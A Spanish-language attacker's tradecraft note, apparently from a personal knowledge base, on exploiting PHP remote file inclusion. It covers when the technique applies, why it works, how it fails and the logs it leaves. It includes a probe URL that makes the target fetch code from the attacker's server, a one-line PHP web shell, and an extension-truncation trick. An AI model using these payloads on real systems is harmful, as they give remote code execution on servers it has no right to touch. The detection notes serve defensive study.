---
tipo: tradecraft
clase: "[[CWE-98 - File Inclusion]]"
eje: tipo
implementacion: "include de PHP sobre una URL remota controlada por el atacante"
opsec: requiere-bypass
telemetria: ["[[Log de acceso del servidor web]]", "[[Consulta DNS saliente]]"]
requisitos: [allow_url_include-on, egress-de-red]
coste: bajo
alternativas: ["[[LFI - inclusión local]]"]
probado: 2026-08-06
contexto: [php-legacy]
aliases:
  - RFI
  - remote file inclusion
tags:
  - dominio/web
---

# RFI - inclusión remota

## Cuándo lo elijo

Cuando la app incluye una ruta controlable **y** puedo apuntarla a una URL mía. Es el caso fácil: no hay que envenenar nada, sirvo mi propio PHP y el server lo ejecuta. El problema es que casi nunca está disponible.

Primer chequeo: `?page=http://miservidor/shell.txt`. Si ejecuta, RFI directo. Si no, `allow_url_include` está apagado y quedás en [[LFI - inclusión local]].

## Por qué funciona

Con `allow_url_include=On`, `include` de PHP acepta una URL: descarga el recurso y lo ejecuta como PHP. Sirvo un archivo con `<?php system($_GET['c']); ?>` desde mi servidor y el objetivo lo corre en su contexto.

## Cómo falla

- **`allow_url_include=Off`** — es el default desde PHP 5.2. La razón por la que RFI es raro hoy. Sin esto, no hay RFI.
- **Sin egress** — el server no puede alcanzar mi URL.
- **Extensión forzada** — se corta con `?` o `#` para que la extensión quede en la query (`http://mi/shell.txt?`).
- **Firewall de salida / proxy** que bloquea la descarga.

## Coste

Bajo cuando está: una petición y tenés RCE. El costo real es de **disponibilidad** — la config que lo habilita está apagada por defecto hace más de una década, así que aparece casi solo en apps viejas o mal configuradas.

## Huella esperada

- El parámetro con `http://`/`ftp://` externo en el [[Log de acceso del servidor web]].
- El server hace una petición saliente a mi dominio → [[Consulta DNS saliente]] + conexión HTTP de salida desde la IP del web server. Anomalía fuerte.

Payloads de wrapper equivalentes (`data://`, `php://input`) en [[LFI wrappers - matriz de referencia]].
